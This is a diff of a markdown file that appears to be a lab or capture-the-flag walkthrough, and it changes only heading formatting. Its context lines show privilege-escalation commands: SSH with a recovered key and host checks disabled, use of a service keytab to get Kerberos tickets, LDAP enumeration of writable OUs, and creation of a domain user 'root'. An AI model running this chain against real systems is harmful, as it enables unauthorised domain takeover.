@@ -368,13 +368,13 @@ ssh -i /tmp/.runner_key -o StrictHostKeyChecking=no svc-runner@172.16.20.3 'id; 
 
 ## Privesc (svc-runner → root SRV01 → DC01 root)
 
-**4.1 — interactive session as svc-runner**
+4.1 — interactive session as svc-runner
 
 ```bash
 ssh -i /tmp/.runner_key -o StrictHostKeyChecking=no svc-runner@172.16.20.3
 ```
 
-**4.3 — recover domain credential**
+4.3 — recover domain credential
 
 ```bash
 systemctl cat gitea-runner
@@ -384,7 +384,7 @@ kinit -kt /etc/gitea-runner/svc-runner.keytab svc-runner
 klist
 ```
 
-**4.4 — LDAP bind**
+4.4 — LDAP bind
 
 ```bash
 ldapsearch -x -H ldap://172.16.20.2 -s base -b '' dnsHostName defaultNamingContext 2>&1 | grep -iE 'dnsHostName|defaultNamingContext'
@@ -392,7 +392,7 @@ echo "SASL_NOCANON on" > ~/.ldaprc
 ldapwhoami -Y GSSAPI -H ldap://DC02.darkzero.ext
 ```
 
-**4.5 — find writable OU + confirm create rights**
+4.5 — find writable OU + confirm create rights
 
 ```bash
 ldapsearch -Y GSSAPI -H ldap://DC02.darkzero.ext -b "DC=darkzero,DC=ext" \
@@ -410,7 +410,7 @@ EOF
 ldapadd -Y GSSAPI -H ldap://DC02.darkzero.ext -f /tmp/test.ldif
 ```
 
-**4.6 — create domain user `root`**
+4.6 — create domain user `root`
 
 ```bash
 ldapdelete -Y GSSAPI -H ldap://DC02.darkzero.ext "CN=testobj,OU=GiteaMigration,DC=darkzero,DC=ext"
